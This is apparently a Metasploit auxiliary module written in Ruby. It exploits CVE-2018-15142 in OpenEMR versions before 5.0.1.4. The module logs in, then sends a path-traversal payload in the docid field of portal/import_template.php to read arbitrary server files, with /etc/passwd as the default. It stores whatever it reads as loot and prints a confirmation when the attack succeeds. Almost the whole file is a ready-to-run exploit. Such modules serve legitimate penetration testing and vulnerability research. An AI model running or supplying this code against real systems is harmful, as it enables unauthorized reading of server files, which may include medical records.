##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OpenEMR prior to 5.0.1.4 Authenticated Arbitrary File Read',
        'Description' => %q{
          This module exploits an authenticated arbitrary file read vulnerability
          in OpenEMR prior to version 5.0.1.4 (CVE-2018-15142). The portal
          import_template.php script passes the docid parameter directly to
          file_get_contents() when mode=get, allowing any authenticated user
          to read arbitrary server-side files.
        },
        'Author' => [
          'Joshua Fam', # Original advisory
          'AMENDER'     # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2018-15142'],
          ['EDB', '45202']
        ],
        'DisclosureDate' => 'Aug 14, 2018',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'The base path to OpenEMR', '/']),
        OptString.new('USERNAME', [true, 'The OpenEMR username', 'admin']),
        OptString.new('PASSWORD', [true, 'The OpenEMR password', '']),
        OptString.new('SITE', [true, 'The OpenEMR site identifier', 'default']),
        OptString.new('TARGETFILE', [true, 'The file to read from the server', '/etc/passwd'])
      ]
    )
  end

  def do_login
    # First, get the login page to obtain CSRF token
    login_uri = normalize_uri(target_uri.path, 'interface', 'login', 'login.php')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => login_uri,
      'vars_get' => {
        'site' => datastore['SITE']
      }
    )

    unless res
      print_error('[-] Connection failed while fetching login page')
      return nil
    end

    # Extract CSRF token if present
    csrf_token = nil
    if res.body =~ /csrf_token_form.*?value=["']([^"']+)["']/m
      csrf_token = ::Regexp.last_match(1)
      vprint_status("CSRF token obtained: #{csrf_token}")
    end

    # Perform authentication
    auth_uri = normalize_uri(target_uri.path, 'interface', 'main', 'main_screen.php')
    post_data = {
      'new_login_session_management' => '1',
      'authProvider' => 'Default',
      'authUser' => datastore['USERNAME'],
      'clearPass' => datastore['PASSWORD'],
      'languageChoice' => '1'
    }
    post_data['csrf_token_form'] = csrf_token if csrf_token

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => auth_uri,
      'vars_get' => {
        'auth' => 'login',
        'site' => datastore['SITE']
      },
      'vars_post' => post_data,
      'keep_cookies' => true
    )

    unless res
      print_error('[-] Connection failed during authentication')
      return nil
    end

    # Check for authentication failure markers
    if res.body.include?('login_screen.php?error=1') || res.body.include?('Invalid username or password')
      print_error('[-] Authentication failed - invalid credentials')
      return nil
    end

    print_good('[+] Authentication successful')
    true
  end

  def read_file(file_path)
    vuln_uri = normalize_uri(target_uri.path, 'portal', 'import_template.php')

    # Path traversal required to escape the document root
    traversal = "../../../../../../../../../../../.." + file_path

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => vuln_uri,
      'vars_post' => {
        'mode' => 'get',
        'docid' => traversal
      },
      'keep_cookies' => true
    )

    unless res
      print_error('[-] Connection failed during file read request')
      return nil
    end

    # Check for session failure markers
    if res.body.include?('login_screen.php?error=1') || res.body.include?('Invalid username or password')
      print_error('[-] Session rejected - authentication may have expired')
      return nil
    end

    # Empty response might mean file not found
    if res.body.strip.empty?
      print_error('[-] File not found or empty response')
      return nil
    end

    res.body
  end

  def run
    print_status("[*] OpenEMR prior to 5.0.1.4 - Authenticated Arbitrary File Read (CVE-2018-15142)")
    print_status("[*] Target: #{rhost}:#{rport}")
    print_status("[*] Authenticating as '#{datastore['USERNAME']}'...")

    unless do_login
      print_error('[-] Login failed, aborting')
      return
    end

    print_status("[*] Reading file: #{datastore['TARGETFILE']}")

    content = read_file(datastore['TARGETFILE'])
    unless content
      print_error('[-] Failed to read file')
      return
    end

    print_good('[+] File content:')
    print_line(content)

    # Store the loot
    loot_path = store_loot(
      'openemr.file',
      'text/plain',
      rhost,
      content,
      datastore['TARGETFILE'],
      'OpenEMR Arbitrary File Read'
    )
    print_good("[+] File saved to: #{loot_path}")

    # Confirm exploitation with expected pattern
    if content.include?('root:x:0:0')
      print_good('[+] CONFIRMED: CVE-2018-15142 exploitation successful!')
    end
  end
end